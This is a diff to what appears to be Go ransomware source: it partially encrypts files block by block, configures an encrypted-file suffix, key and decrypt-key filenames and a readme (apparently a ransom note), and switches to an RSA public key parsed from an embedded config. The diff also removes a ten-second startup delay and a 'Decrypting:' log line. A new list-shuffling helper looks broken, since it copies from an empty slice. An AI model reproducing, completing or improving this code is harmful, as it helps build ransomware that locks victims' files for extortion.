@@ -8,7 +8,10 @@ import (
 	"fmt"
 	"os"
 	"strings"
-	"time"
+	"crypto/rsa"
+	"math/big"
+	"strconv"
+	"math/rand"
 )
 
 func encrypt(filename string, cip cipher.Block) error {
@@ -26,7 +29,7 @@ func encrypt(filename string, cip cipher.Block) error {
 
 	buf, out := make([]byte, 16), make([]byte, 16)
 	step := 0
-	for offset := int64(0); size-offset > 16 && offset < (1024*1024); offset += 16 {
+	for offset := jumpHead; size-offset > 16 && offset < encSize; offset += 16 {
 		if step < jumpPer {
 			step += 1
 		} else {
@@ -49,7 +52,7 @@ func decrypt(filename string, cip cipher.Block) error {
 		return nil
 	}
 	f, err := os.OpenFile(filename, os.O_RDWR, 0)
-	fmt.Println("Decrypting: ", filename)
+	fmt.Println(filename)
 	if err != nil {
 		return err
 	}
@@ -58,7 +61,7 @@ func decrypt(filename string, cip cipher.Block) error {
 
 	buf, out := make([]byte, 16), make([]byte, 16)
 	step := 0
-	for offset := int64(0); size-offset > 16 && offset < (1024*1024); offset += 16 {
+	for offset := jumpHead; size-offset > 16 && offset < encSize; offset += 16 {
 		if step < jumpPer {
 			step += 1
 		} else {
@@ -107,7 +110,6 @@ func doHandler(cip cipher.Block, ListChan chan string, ExitChan chan bool) {
 }
 
 func startHandler(cip cipher.Block, list chan string) {
-	time.Sleep(10 * time.Second)
 	ExitChan := make(chan bool, procNum)
 	for i := 0; i < procNum; i++ {
 		go doHandler(cip, list, ExitChan)
@@ -119,13 +121,13 @@ func startHandler(cip cipher.Block, list chan string) {
 
 type Config struct {
 	//加密设置
-	PubKey       string
+	pubKey  rsa.PublicKey
+	PubKeyN string
+	PubKeyE int
+
 	Filesuffix   string
 	KeyFilename  string
 	DkeyFilename string
-
-	//运行提示设置
-	Alert string
 
 	//readme设置
 	Readme         string
@@ -151,6 +153,24 @@ func (self *Config) init(EncData string) {
 
 	json.Unmarshal(data, self)
 
-	self.PubKey = "\n" + self.PubKey
+	nList := strings.Split(self.PubKeyN, "/")
+	N := make([]byte, len(nList))
+	for c, i := range nList {
+		tmp, _ := strconv.Atoi(i)
+		N[c] = byte(tmp)
+	}
+
+	self.pubKey = rsa.PublicKey{N: new(big.Int).SetBytes(N), E: self.PubKeyE}
 	self.EncSuffixList = strings.Split(self.EncSuffix, "|")
+}
+
+func reList(theList []string, count int) []string {
+	tmpList := make([]string, len(theList))
+	slNum := rand.Int() % len(theList)
+	copy(tmpList, tmpList[:slNum])
+	copy(tmpList[slNum:], tmpList[slNum:])
+	if count > 1 {
+		return reList(tmpList, count-1)
+	}
+	return tmpList
 }
